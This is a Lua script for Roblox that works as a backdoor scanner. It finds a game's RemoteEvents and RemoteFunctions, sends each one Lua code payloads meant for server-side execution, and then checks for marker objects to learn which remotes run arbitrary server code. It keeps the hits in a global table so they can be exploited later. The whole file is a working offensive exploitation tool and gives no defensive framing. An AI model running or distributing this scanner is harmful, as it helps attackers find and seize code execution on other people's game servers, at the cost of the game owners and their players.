local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
                  'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9'}

_G.backdoors = {}

local function generateName(len)
    local name = ""
    for i = 1, len do
        name = name .. alphabet[math.random(1, #alphabet)]
    end
    return name
end

local function fireRemote(remote, payload)
    if remote:IsA("RemoteEvent") then
        remote:FireServer(payload)
    elseif remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(function()
                remote:InvokeServer(payload)
            end)
        end)
    end
end

local function testPayload(remote, code)
    local payloads = {
        "local i=Instance.new('Folder',workspace)i.Name='"..code.."'",
        "Instance.new('StringValue',workspace).Name='"..code.."'",
        "Instance.new('BoolValue',workspace).Value=true;Instance.new('Folder',workspace).Name='"..code.."'",
        "game.ReplicatedStorage:FindFirstChild('"..code.."',true)or Instance.new('Folder',workspace).Name='"..code.."'",
        "local f=Instance.new('Folder')f.Parent=workspace f.Name='"..code.."'",
        "spawn(function() Instance.new('IntValue',workspace).Name='"..code.."' end)",
    }

    for _, payload in ipairs(payloads) do
        fireRemote(remote, payload)
        task.wait()
    end

    if remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(function()
                remote:InvokeServer("execute", payloads[1])
                remote:InvokeServer("run", payloads[1])
                remote:InvokeServer("load", payloads[1])
                remote:InvokeServer(payloads[1])
                remote:InvokeServer({payloads[1]})
                remote:InvokeServer("code", payloads[1])
                remote:InvokeServer("", payloads[1])
            end)
        end)
    end
end

local function scan()
    _G.backdoors = {}
    local tests = {}

    local commonNames = {
        "MainRemote", "Remote", "Execute", "Server", "Backdoor", "lh",
        tostring(game.PlaceId * 1337),
        "lh" .. tostring(game.PlaceId / 6666 * 1337 * game.PlaceId),
        "RemoteEvent", "Func", "Event",
    }

    for _, name in ipairs(commonNames) do
        for _, container in ipairs({game.ReplicatedStorage, game:GetService("Lighting"), workspace}) do
            local remote = container:FindFirstChild(name)
            if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
                local code = generateName(math.random(30, 40))
                testPayload(remote, code)
                tests[code] = {remote = remote, path = remote:GetFullName()}
            end
        end
    end

    for _, remote in ipairs(game:GetDescendants()) do
        if not (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then continue end

        local fullName = remote:GetFullName()
        if fullName:find("^RobloxReplicatedStorage") or fullName:find("DefaultChatSystemChatEvents") then continue end
        if remote.Name == "__FUNCTION" then continue end

        local parent = remote.Parent
        local pparent = parent and parent.Parent
        if pparent and (pparent.Name == "HDAdminClient" or pparent.Name == "Adonis") then continue end

        local code = generateName(math.random(35, 45))
        testPayload(remote, code)
        tests[code] = {remote = remote, path = fullName}
    end

    for i = 1, 200 do
        for code, info in pairs(tests) do
            local marker = workspace:FindFirstChild(code)
            if marker then
                marker:Destroy()
                table.insert(_G.backdoors, {remote = info.remote, path = info.path})
            end
        end
        task.wait(0.05)
    end
end

task.spawn(scan)
